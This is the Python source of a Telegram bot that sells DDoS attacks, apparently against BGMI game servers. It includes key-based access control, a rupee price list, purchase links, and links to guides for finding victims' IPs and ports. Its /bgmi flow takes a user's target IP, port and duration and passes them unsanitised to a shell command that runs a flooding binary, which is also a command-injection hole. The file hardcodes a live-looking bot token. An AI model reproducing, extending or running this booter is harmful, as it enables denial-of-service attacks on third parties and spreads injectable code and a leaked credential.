import telebot
import subprocess
import requests
import datetime
import os
import threading
import time
import random
import string
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, BotCommand, ReplyKeyboardMarkup, KeyboardButton
from flask import Flask
from threading import Thread



# Insert your Telegram bot token here
bot = telebot.TeleBot('7907030927:AAF3Y_vgwuWTJ7Xwf07TVMucbQsg22sR4MA')

# Admin user IDs
admin_id = ["5034208328"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

KEYS_FILE = "keys.txt"

# Dictionary to store ongoing attacks
ongoing_attacks = {}


def save_keys():
    with open(KEYS_FILE, "w") as file:
        json.dump({k: v.isoformat() for k, v in keys.items()}, file)

def load_keys():
    try:
        with open(KEYS_FILE, "r") as file:
            data = json.load(file)
            return {k: datetime.datetime.fromisoformat(v) for k, v in data.items()}
    except FileNotFoundError:
        return {}

# Load keys at the start
keys = load_keys()



def check_authorization(func):
    def wrapper(message):
        user_id = str(message.chat.id)
        if user_id not in allowed_user_ids and user_id not in admin_id:
            bot.reply_to(message, "Please enter your authorization key:")
            bot.register_next_step_handler(message, authorize_user, func)
        else:
            func(message)
    return wrapper

def authorize_user(message, func):
    user_id = str(message.chat.id)
    if is_key_valid(message.text):
        allowed_user_ids.append(user_id)
        with open(USER_FILE, "a") as file:
            file.write(f"{user_id}\n")
        bot.reply_to(message, "You have been authorized successfully!")
        func(message)
    else:
        bot.reply_to(message, "Invalid or expired key.")    
        
        
        
@bot.message_handler(func=lambda message: message.text == "GENERATE KEY 🔑")
@check_authorization
def handle_generate_key(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        markup = create_duration_keyboard()
        bot.reply_to(message, "Choose the key duration:", reply_markup=markup)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data in ["1_hour", "2_hours", "3_hours", "5_hours", "1_day", "3_days", "7_days", "30_days"])
def handle_key_duration(call):
    user_id = str(call.message.chat.id)
    
    if user_id in admin_id:
        duration_mapping = {
            "1_hour": datetime.timedelta(hours=1),
            "2_hours": datetime.timedelta(hours=2),
            "3_hours": datetime.timedelta(hours=3),
            "5_hours": datetime.timedelta(hours=5),
            "1_day": datetime.timedelta(days=1),
            "3_days": datetime.timedelta(days=3),
            "7_days": datetime.timedelta(days=7),
            "30_days": datetime.timedelta(days=30)
        }
        
        duration = duration_mapping[call.data]
        bot.send_message(call.message.chat.id, "Enter the number of devices:")
        bot.register_next_step_handler(call.message, capture_number_of_devices, duration)
    else:
        bot.reply_to(call.message, "You are not authorized to use this command.")

    
def capture_number_of_devices(message, duration):
    user_id = str(message.chat.id)
    try:
        num_devices = int(message.text)
        keys_generated = []
        for _ in range(num_devices):
            key = generate_key(duration)
            keys_generated.append(key)
        response = f"Generated {num_devices} keys with a duration of {duration} days:\n\n" + "\n".join(keys_generated)
        bot.send_message(message.chat.id, response)
    except ValueError:
        bot.reply_to(message, "Invalid input. Please enter a valid number of devices.")
    
    
    
@bot.message_handler(func=lambda message: message.text == "ALL KEYS 🔑")
@check_authorization
def show_all_keys(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        if keys:
            response = "Generated Keys:\n\n"
            for key, expiry_date in keys.items():
                response += f"Key: {key} (Expires on {expiry_date})\n"
        else:
            response = "No keys found."
    else:
        response = "You are not authorized to use this command."
    
    bot.reply_to(message, response)

            
            
@bot.message_handler(func=lambda message: message.text == "DELETE USER 🚫")
@check_authorization
def delete_user_prompt(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "Please enter the user ID you want to remove:")
        bot.register_next_step_handler(message, delete_user)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

def delete_user(message):
    user_id = str(message.chat.id)
    user_to_remove = message.text
    
    if user_to_remove in allowed_user_ids:
        allowed_user_ids.remove(user_to_remove)
        with open(USER_FILE, "w") as file:
            for user in allowed_user_ids:
                file.write(f"{user}\n")
        bot.reply_to(message, f"User {user_to_remove} has been removed successfully.")
    else:
        bot.reply_to(message, "User ID not found in the authorized list.")
        
        
        
@bot.message_handler(func=lambda message: message.text == "MANUALLY ADD KEY 🔑")
@check_authorization
def manual_add_key_prompt(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "Please enter the key and duration (in days) separated by a space (e.g., KEYS 60):")
        bot.register_next_step_handler(message, manual_add_key)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

def manual_add_key(message):
    user_id = str(message.chat.id)
    try:
        key, duration = message.text.split()
        duration = int(duration)
        expiry_date = datetime.datetime.now() + datetime.timedelta(days=duration)
        keys[key] = expiry_date
        save_keys()
        bot.reply_to(message, f"Key {key} has been added successfully and will expire in {duration} days.")
    except ValueError:
        bot.reply_to(message, "Invalid input. Please enter the key and duration (in days) separated by a space (e.g., KEYS 60).")

        
   
@bot.message_handler(func=lambda message: message.text == "DELETE KEY 🔑")
@check_authorization
def delete_key_prompt(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "Please enter the key you want to delete:")
        bot.register_next_step_handler(message, delete_key)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

def delete_key(message):
    key_to_delete = message.text
    
    if key_to_delete in keys:
        del keys[key_to_delete]
        save_keys()
        bot.reply_to(message, f"Key {key_to_delete} has been deleted successfully.")
    else:
        bot.reply_to(message, "Key not found.")



# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")



@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE.."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE.."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE.."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"𝐒𝐭𝐚𝐫𝐭𝐞𝐝 𝐀𝐭𝐭𝐚𝐜𝐤\n\n🎯𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n💣𝐏𝐨𝐫𝐭: {port}\n⏱️𝐓𝐢𝐦𝐞: {time} Seconds\n⚠️𝐌𝐞𝐭𝐡𝐨𝐝: @CiConfigOfficial"
    bot.reply_to(message, response)

# Dictionary to store the state of each user
user_state = {}

# Dictionary to store ongoing attacks
ongoing_attacks = {}

# Handler for /bgmi command
# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
@check_authorization
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id in ongoing_attacks:
            bot.reply_to(message, "🎯An attack is already in progress. Please wait until it's finished.")
            return

        # Reset user state
        user_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter target IP address:")
    else:
        response = "❌You are not authorized to use this command."
        bot.reply_to(message, response)



@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_bgmi_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port:")
    elif state['step'] == 2:
        try:
            state['port'] = int(message.text)
            state['step'] = 3
            markup = InlineKeyboardMarkup()
            markup.row_width = 2
            markup.add(
                InlineKeyboardButton("1 Minutes", callback_data="60"),
                InlineKeyboardButton("2 Minutes", callback_data="120"),
                InlineKeyboardButton("3 Minutes", callback_data="180"),
                
            )
            bot.reply_to(message, "Choose duration:", reply_markup=markup)
        except ValueError:
            bot.reply_to(message, "❌Invalid port. Please enter a numeric value for the port:")

@bot.callback_query_handler(func=lambda call: True)
def handle_duration_choice(call):
    user_id = str(call.message.chat.id)
    if user_id in user_state:
        state = user_state[user_id]
        try:
            state['time'] = int(call.data)
            if state['time'] > 180:
                bot.reply_to(call.message, "❌Error: Time interval must be less than 601 seconds.")
            else:
                if user_id in ongoing_attacks:
                    bot.reply_to(call.message, "🎯An attack is already in progress. Please wait until it's finished.")
                    return

                record_command_logs(user_id, '/bgmi', state['target'], state['port'], state['time'])
                log_command(user_id, state['target'], state['port'], state['time'])
                ongoing_attacks[user_id] = True
                start_attack_reply(call.message, state['target'], state['port'], state['time'])
                full_command = f"./soulcracks {state['target']} {state['port']} {state['time']} 100"
                subprocess.run(full_command, shell=True)
                bot.reply_to(call.message, f"𝐁𝐠𝐦𝐢 𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {state['target']} \n𝐏𝐨𝐫𝐭: {state['port']} \n𝐓𝐢𝐦𝐞: {state['time']} seconds")
                del ongoing_attacks[user_id]
            del user_state[user_id]  # Clear the state for the user
        except ValueError:
            bot.reply_to(call.message, "Invalid Command:")
            
            
            
@bot.message_handler(func=lambda message: message.text == "⚔️ START ATTACK ⚔️")
@check_authorization
def start_attack_prompt(message):
    user_id = str(message.chat.id)
    if user_id not in user_state:
        user_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter target IP address:")
    elif user_state[user_id]['step'] == 1:
        bot.reply_to(message, "Please enter the target IP address first.")
    elif user_state[user_id]['step'] == 2:
        bot.reply_to(message, "Please enter the target port.")
    elif user_state[user_id]['step'] == 3:
        bot.reply_to(message, "Please enter the attack duration (in seconds).")

@bot.message_handler(func=lambda message: str(message.chat.id) in user_state)
def handle_attack_steps(message):
    user_id = str(message.chat.id)
    state = user_state[user_id]

    if state['step'] == 1:
        state['target_ip'] = message.text
        state['step'] = 2
        bot.reply_to(message, "Enter target port:")
    elif state['step'] == 2:
        try:
            state['target_port'] = int(message.text)
            state['step'] = 3
            bot.reply_to(message, "Enter attack duration (in seconds):")
        except ValueError:
            bot.reply_to(message, "Invalid port. Please enter a numeric value for the port:")
    elif state['step'] == 3:
        try:
            state['duration'] = int(message.text)
            target_ip = state['target_ip']
            target_port = state['target_port']
            duration = state['duration']
            user_state[user_id]['step'] = 0  # Reset the state after finishing

            # Start the attack (Placeholder for actual attack code)
            response = f"Attack started on IP: {target_ip}, Port: {target_port} for {duration} seconds."
            bot.reply_to(message, response)

            # You can replace the above line with the actual code to start the attack
            # Example: subprocess.run(["attack_script", target_ip, target_port, duration])
        except ValueError:
            bot.reply_to(message, "Invalid duration. Please enter a numeric value for the duration:")
            
            
            


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
@check_authorization
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['settings'])
@check_authorization
def show_settings(message):
    settings_text ='''🤖 Available commands:
➡️ TO START ATTACK : /bgmi 

➡️ CHECK RULES BEFORE USE : /rules

➡️ CHECK YOUR RECENT LOGS : /mylogs

➡️ SERVER FREEZE PLANS : /plan

'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/settings'):
                settings_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                settings_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, settings_text)
    
    
@bot.message_handler(commands=['apply'])
@check_authorization
def show_apply(message):
    apply_text ='''📷 DDOS APPLY PROCESS 

📁HTTP CANARY - t.me/CISETUPP/272

🗂️IOS HTTP CANARY - t.me/CISETUPP/321

🎥ANDROID IP PORT FINDER VIDEO 
- t.me/CISETUPP/216

📹IOS IP PORT FINDER VIDEO 
- t.me/CISETUPP/333

🎯ATTACK PROCESS - t.me/CISETUPP/334
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/apply'):
                apply_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                apply_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, apply_text)

@bot.message_handler(commands=['start'])
@check_authorization
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.from_user.id)
    username = message.from_user.username
    
    response = f''' {user_name}! 💣Welcome to Your Home.\n🥰Run This Command : /settings\n🥇Welcome To The World's Best Ddos Bot\n❤️‍🩹Owner :- @CiConfigOwner \nTG :- t.me/CiConfigOfficial

'''    
    admin_message = f"⚠️New user started the bot:\nUsername: @{username}\nUser ID: {user_id}"
    
    # Send a message to the admin
    for admin in admin_id:
        bot.send_message(admin, admin_message)
    
    # Automatically authorize admin and send the appropriate keyboard
    if user_id in admin_id:
        if user_id not in allowed_user_ids:
            allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id}\n")
        markup = create_admin_keyboard()
    else:
        markup = create_user_keyboard()
    
    bot.reply_to(message, response, reply_markup=markup)
    
    

@bot.message_handler(commands=['rules'])
@check_authorization
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 🫂Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:\n
✨Vip :
-> Attack Time : Max (S)
> After Attack Limit : 0 Sec
-> Concurrents Attack : VVIP+

🗝️Pr-ice List:
❓1 Day-->80 Rs
🌡3 Day-->200 Rs
😀Week-->350 Rs
👍2 Week-->550 Rs
😀Month-->900 Rs

🥰Own Ddos Bot
File :- 549₹

Dm to buy ddos 🔗
Dm - @CiConfigOwner 🔝


🔗YOU CAN BUY FROM HERE
:- https://CiDdos.000.pe
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admin'])
def showadmin_use(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

➡️ /add <userId> : Add a User.
➡️ /remove <userid> Remove a User.
➡️ /allusers : Authorised Users Lists.
➡️ /logs : All Users Logs.
➡️ /broadcast : Broadcast a Message.
➡️ /clearlogs : Clear The Logs File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE.."

    bot.reply_to(message, response)
    
#menu button 
def set_bot_commands():
    commands = [
        BotCommand("start", "Start the bot"),
        BotCommand("id", "Your Chat Id"),
        BotCommand("bgmi", "Start Attack"),
        BotCommand("settings", "Run settings command"),
        BotCommand("apply", "Ddos apply proces"),
    ]
    bot.set_my_commands(commands)
    
def generate_key(duration: datetime.timedelta):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    expiry_date = datetime.datetime.now() + duration
    keys[key] = expiry_date
    save_keys()
    return key


def is_key_valid(key):
    if key in keys:
        if datetime.datetime.now() < keys[key]:
            return True
        else:
            del keys[key]
            save_keys()
    return False

    
def create_duration_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("1 Hour", callback_data="1_hour"),
        InlineKeyboardButton("2 Hours", callback_data="2_hours"),
        InlineKeyboardButton("3 Hours", callback_data="3_hours"),
        InlineKeyboardButton("5 Hours", callback_data="5_hours"),
        InlineKeyboardButton("1 Day", callback_data="1_day"),
        InlineKeyboardButton("3 Days", callback_data="3_days"),
        InlineKeyboardButton("7 Days", callback_data="7_days"),
        InlineKeyboardButton("30 Days", callback_data="30_days")
    )
    return markup              
 
    
          
def create_user_keyboard():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    
    button1 = KeyboardButton("⚔️ START ATTACK ⚔️")
    button2 = KeyboardButton("RULES ℹ️")
    button3 = KeyboardButton("MY LOGS 📝")
    button4 = KeyboardButton("HELP ❓")
    button5 = KeyboardButton("BUY PLAN 🛒")
    button6 = KeyboardButton("APPLY PROCES 📷")

    markup.add(button1)
    markup.row(button2, button3)
    markup.row(button4, button5)
    markup.add(button6)
    
    return markup

def create_admin_keyboard():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=False)
    
    button1 = KeyboardButton("⚔️ START ATTACK ⚔️")
    button2 = KeyboardButton("LOGS 📊")
    button3 = KeyboardButton("ALL USERS 👥")
    button4 = KeyboardButton("CLEAR LOGS 🗑️")
    button5 = KeyboardButton("GENERATE KEY 🔑")
    button6 = KeyboardButton("ALL KEYS 🔑")
    button7 = KeyboardButton("DELETE USER 🚫")
    button8 = KeyboardButton("MANUALLY ADD KEY 🔑")
    button9 = KeyboardButton("DELETE KEY 🔑")
    button10 = KeyboardButton("ADMIN COMMAND ✨")

    

    markup.add(button1)
    markup.row(button2, button3)
    markup.row(button4, button5)
    markup.row(button6, button7)
    markup.row(button8, button9)
    markup.add(button10)
    
    return markup


    
@bot.message_handler(func=lambda message: message.text in ["⚔️ START ATTACK ⚔️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒", "APPLY PROCES 📷"])
def handle_user_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if message.text == "⚔️ START ATTACK ⚔️":
            handle_bgmi(message)
        elif message.text == "RULES ℹ️":
            welcome_rules(message)
        elif message.text == "MY LOGS 📝":
            show_command_logs(message)
        elif message.text == "HELP ❓":
            show_settings(message)
        elif message.text == "BUY PLAN 🛒":
            welcome_plan(message)
        elif message.text == "APPLY PROCES 📷":
            show_apply(message)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")
        
        
@bot.message_handler(func=lambda message: message.text in ["⚔️ START ATTACK ⚔️", "LOGS 📊", "ALL USERS 👥", "CLEAR LOGS 🗑️", "ADMIN COMMAND ✨"])
def handle_admin_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        if message.text == "⚔️ START ATTACK ⚔️":
            handle_bgmi(message)
        elif message.text == "LOGS 📊":
            show_recent_logs(message)
        elif message.text == "ALL USERS 👥":
            show_all_users(message)
        elif message.text == "CLEAR LOGS 🗑️":
            clear_logs_command(message)
        elif message.text == "ADMIN COMMAND ✨":
            showadmin_use(message)

    else:
        bot.reply_to(message, "You are not authorized to use this command.")
        


if __name__ == "__main__":
    set_bot_commands()

# Function to send the /start command every 30 seconds
def send_start_command():
    while True:
        try:
            bot.send_message(admin_id[0], 'Bot Refreshing..')
            time.sleep(14100)
        except Exception as e:
            print(f"Error sending server running... command: {e}")
            time.sleep(14100)

# Start the thread that sends the /start command
start_thread = threading.Thread(target=send_start_command)
start_thread.daemon = True  # Ensure it exits when the main program exits
start_thread.start()

# Function to print "running <number>" every second



app = Flask(__name__)

@app.route('/')
def index():
    return "Alive"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# Main script
if __name__ == "__main__":
    keep_alive()

    while True:
        try:
            bot.polling(none_stop=True)  # Ensure 'bot' is defined in your context
        except Exception as e:
            print(e)


